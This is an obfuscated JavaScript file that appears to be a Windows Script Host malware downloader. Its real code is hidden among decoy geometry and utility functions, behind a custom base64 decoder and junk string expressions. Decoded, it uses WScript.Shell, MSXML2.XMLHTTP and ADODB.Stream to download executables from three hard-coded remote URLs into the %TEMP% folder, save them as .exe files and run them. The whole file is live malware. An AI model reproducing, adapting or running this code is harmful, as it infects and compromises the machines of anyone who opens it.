
var movement = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  foolscap = [];
var ottoman = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};var tears = 0;
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function tally(belittle) {
	abdicated = belittle;
	for (var i in ottoman){abdicated = abdicated.replace(i, ottoman[i]);}
    return abdicated;
};

var support = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.tally4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("sapphire").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = movement[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = movement[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = movement[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = movement[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var niche ="sapphireJVsapphireRFTVsapphireAl".tally4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var forty = "sapphireQWsapphireN0aXZsapphirelWE9iasapphiremVjdA=sapphire=".tally4();
String.prototype.tally2 = function () {
    var offering = {
        versatility: this
    };
    offering.brake = offering.versatility["c3Vic3RyaW5n".tally4()](tears, support);
    return offering.brake;
};

var ablution ="sapphireRXhwYW5sapphirekRW52aXsapphireJvbm1lbnRTdHJsapphirepbmdz".tally4();
var Native = function(options){
	
};
var rhythmic = [forty, ablution,niche,  ""+"."+("wording","twentyeighth","think","linden","terrorist","crabs","budget","candy","exe"), "UnVu".tally4(), tally("M"+"SX"+"ML"+("determination","cutter","helmet","genes","bowler","dryness","apostolic","2.")+"|M"+"LH"+"TT"+("justin","profligacy","intermittent","trolley","corners","provided","veneer","congratulations","P>")+"WU"+("syndicate","wakes","anyone","transitive","copyist","analyzed","learned","cr")+("retard","offshore","journalistic","thirtyseven","aground","bairn","union","ascension","ip")+"t:"+("tyrannical","improve","cycle","relevant","stupefaction","summer","valued","recommend","Sh")+"ell")];
wells = "_F2_";
var dakota = this[rhythmic.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
BpYreFNy = "mxbNfAYiw";
promising = (("beeves", "state", "residential", "reproductive", "incredible", "irate", "tokyo", "pdIvFHdQpWdP") + "eRvcEfhYGP").tally2();
worried = (("rewritten", "advocacy", "reorganization", "parsley", "offline", "duncan", "disposal", "patronize", "specify", "sCigNxGwEvs") + "SNfIqo").tally2();
  
    String.prototype.dragon = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var artistic = rhythmic.pop().split(">");

natalie = "b3Blbg==".tally4();
var metallic = new dakota(artistic[1]);
var calendars = new dakota(artistic[0]);
var prepare = metallic[rhythmic.shift()](rhythmic.shift());
weasel = (("course", "expected", "birthday", "walking", "EqQvLAti") + "cVSaxrnT").tally2();

var morose = rhythmic.shift();
var fergus = rhythmic.shift();
function spears(coated, cursory) {

    try {
        var promoter = prepare + "/" + cursory ;
		promoter = promoter+ morose;
            calendars[natalie](("laddie","trump","G" + weasel) + ("hydraulic","advocated","discharge","masters","T"), coated, false);
       
    wAosHzxttXY = "_F7_";
    calendars[worried + ("colored","brooch","end")]();
	var surrounding=(WScript+"promising"=="V2luZG93cyBTY3JpcHQgSG9zdA==".tally4()+"promising")&&calendars["c3RhdHVz".tally4()] +""=="MjAw".tally4()&&typeof(WUNSKqXsP)==="undefined";
	lQHNgR = "_F8_";
    if (surrounding) {
		
        var antipathy = new dakota((("cameo","factious","floral","carboniferous","clyde","achieves","millet","travelling","A")+("lefthanded","ribald","elector","vbulletin","goldsmith","centaur","region","turtle","SEOO")+"DB"+("melissa","inactivity","octagonal","america","analogies","mapping","riley",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        antipathy[natalie]();
        MFgDAKuTN = "_F9_";
        antipathy.type = support;
        TllPYTHqW = "_F10_";
        antipathy["d3JpdGU=".tally4()](calendars[("evaporation","valueless","divorced","concerned","interval","slack","accurately","")+"R"+"es"+"pon"+ottoman['U'].toLowerCase()+"e"+"Qm9keQ==".tally4()]);
        hvjKfafh = "_F11_";
        antipathy[(promising + "o"+("interchange","fatigues","exorbitant","decomposition","format","checked","phenomenal","beryl","00")+("barcelona","modulation","authorities","scores","pique","stalking","aviation","8i")+"tion").replace("0"+("quicksand","rentals","protestant","irascible","milestone","groundwater","thorax","08"), worried)] = 0;
        boAcONImeY = "_F12_";
        antipathy[("larger","branches","tardily","defendant","corral","sentence","jackson","s")+"aveT"+"oF"+"ile"](promoter, 2);
        XyjsMKIXTQ = "_F13_";
        antipathy.close();
        HvyAqvuxz = "_F14_";
		metallic[fergus](promoter, support, true);
    }
} catch (niMqsjwbq) { };

    DrksHmPWu = "_F15_";
}
try{
spears("aHR0cDovLw==".tally4()+"\u0073\u0072\u0076\u0030\u0032"+"\u002E\u0064\u0073\u0070\u0069\u006E\u0074\u0065\u0072\u0061\u0063\u0074\u0069\u0076\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0064\u0066\u0067\u0034\u0067\u0033" + "?gmUsGfD=wmQGygK","vcuBmWC");}catch(epkfRe){}

try{
spears("aHR0cDovLw==".tally4()+"\u0073\u0076\u0065\u0069\u006B\u0061\u0074\u0061\u002D\u006A\u0075\u006D"+"\u0073\u002E\u006C\u0074\u002F\u0036\u0035\u0067\u0034\u0033\u0034\u0066" + "?xcizamuIm=iEdQVSeHr","NBSejJMnrU");}catch(vrGsDpGJ){}
spears("aHR0cDovLw==".tally4()+"\u0062\u0061\u006C\u0074\u0065\u006C\u0061"+"\u002E\u006C\u0074\u002F\u0034\u0033\u0034\u0035\u0034\u0079\u0074\u0033\u0032" + "?bsiVer=qiwgwAoQ","jepqzhrqgMm");
   xsCxXnNu = "_F16_";
   